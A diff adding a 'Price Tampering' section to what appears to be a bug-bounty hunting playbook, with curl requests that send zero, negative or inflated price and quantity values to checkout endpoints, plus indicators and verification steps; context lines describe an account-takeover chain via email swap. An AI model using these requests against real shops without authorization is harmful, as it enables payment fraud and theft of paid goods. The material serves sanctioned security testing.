@@ -235,3 +235,43 @@ The following real, verified bug-bounty / coordinated-disclosure cases extend th
 - **`hunt-ato`** — Logic bugs in password reset, email change, and recovery flows are core ATO paths. Chain primitive: business logic (email change accepts without re-auth) + `hunt-ato` Path 2 → silent victim email swap → password reset to attacker mailbox.
 - **`security-arsenal`** — Load the Business-Logic Probe Checklist (negative quantity, decimal overflow, currency swap, step-skip via direct URL nav, state-machine reverse) and the Always-Rejected list to avoid filing self-inflicted bugs.
 - **`triage-validation`** — Apply the 7-Question Gate (especially Q4 "Is this exploitable by an outside attacker without unrealistic preconditions?"): logic bugs need a concrete dollar/PII/state impact, not just "the flow looks weird".
+
+---
+
+## Price Tampering — Client-Side Trust Pattern
+
+**The #1 business logic pattern in SaaS**: the server trusts the `price` field from the client request body. The client sends `"price":0` and the server creates a checkout session at R$0 instead of looking up the product price from the database.
+
+### Detection
+```bash
+# 1. Create a purchase with normal flow, capture the request
+# 2. Replay with modified price
+curl -sk -X POST "https://api.target.com/checkout" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"items":[{"id":"premium_product","quantity":1,"price":0}]}'
+
+# 3. Test negative prices  
+curl -sk -X POST "https://api.target.com/api/payments/create" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"items":[{"id":"plan","quantity":1,"price":-100}]}'
+
+# 4. Test arbitrary quantities
+curl -sk -X POST "https://api.target.com/api/checkout" \
+  -d '{"items":[{"id":"key","quantity":999,"price":0}]}'
+```
+
+### Indicators
+- Checkout/payment endpoint returns a third-party payment URL (Stripe, Asaas, MercadoPago)
+- The payment URL has `cs_test_` prefix (Stripe test mode — payment not actually processed)
+- Server responds with purchase ID + checkout URL regardless of price value
+- Product prices visible in JS bundle but never cross-referenced server-side
+
+### Verification
+- **Confirmed**: Checkout URL created at R$0, payment page loads showing R$0.00
+- **Confirmed critical**: Purchase completed at R$0, license/key granted
+- **False positive**: Server rejects with "price mismatch" or uses server-side price lookup
+
+### Related
+- `hunt-write-gap` — When price tampering succeeds because the server PATCH/POST endpoint lacks validation
+- `hunt-supabase` — PostgREST accepting any value for price fields via anon key
